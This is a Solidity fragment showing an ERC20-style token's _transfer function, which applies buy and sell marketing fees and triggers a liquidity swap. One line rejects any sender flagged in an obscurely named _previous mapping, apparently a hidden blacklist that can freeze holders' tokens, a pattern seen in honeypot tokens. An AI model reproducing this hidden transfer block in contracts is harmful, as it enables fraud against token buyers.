    function _transfer(address from, address to, uint256 amount) private returns (bool) {



        require(from != address(0), "ERC20: transfer from the zero address");

        require(!_previous[from]);

        require(to != address(0), "ERC20: transfer to the zero address");



        if(inSwapAndLiquify)

        {

            return _basicTransfer(from, to, amount); 

        }

        else

        {

            uint256 contractTokenBalance = balanceOf(address(this));

            if (!inSwapAndLiquify && !isMarketPair[from]) 

            {

                swapAndLiquify(contractTokenBalance);

            }



            _balances[from] = _balances[from].sub(amount);



            uint256 finalAmount;

            if (_isExcludefromFee[from] || _isExcludefromFee[to]){

                finalAmount = amount;

            }else{

                uint256 feeAmount = 0;



                if(isMarketPair[from]) {

                    feeAmount = amount.mul(_buyMarketingFee).div(100);

                }

                else if(isMarketPair[to]) {

                    feeAmount = amount.mul(_sellMarketingFee).div(100);

                }



                if(feeAmount > 0) {

                    _balances[address(this)] = _balances[address(this)].add(feeAmount);

                    emit Transfer(from, address(this), feeAmount);

                }



                finalAmount = amount.sub(feeAmount);

            }

            

            _balances[to] = _balances[to].add(finalAmount);

            emit Transfer(from, to, finalAmount);

            return true;

        }

    }
